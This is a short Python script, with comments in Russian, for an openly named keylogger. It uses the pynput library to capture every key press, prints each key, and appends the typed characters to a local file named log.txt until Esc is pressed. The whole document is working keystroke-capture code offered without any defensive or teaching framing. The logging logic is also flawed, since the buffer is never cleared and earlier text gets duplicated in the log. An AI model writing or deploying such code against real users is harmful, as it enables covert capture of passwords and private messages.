import pynput
from pynput.keyboard import Key, Listener

class KeyLogger:

    def __init__(self):
        self.count = 0 # подсчет символов
        self.keys = []

    def on_press(self, key):
        print(f"{key} pressed")

        self.keys.append(key)
        self.count += 1

        if self.count >= 10:
            self.write_file(self.keys) #Если юзер нажал больше 10 символов


    def on_release(self, key):
        if key == Key.esc:
            return False

    def write_file(self, keys): #Сохраняет нажатия кнопки в файл
        with open("log.txt", "a") as file:
            for key in self.keys:
                k = str(key).replace("'", "") #ут просто убираю кавычки из вывода в терминал

                if k.find("space") > 0:
                    file.write("\n") #Если есть спейс то переносим строку
                elif k.find("Key") == -1:
                    file.write(k)


if __name__ == "__main__":
    obj = KeyLogger()

    with Listener(on_press=obj.on_press, on_release=obj.on_release) as listener:  # Исправлено на "listener" (с маленькой буквы)
        listener.join()
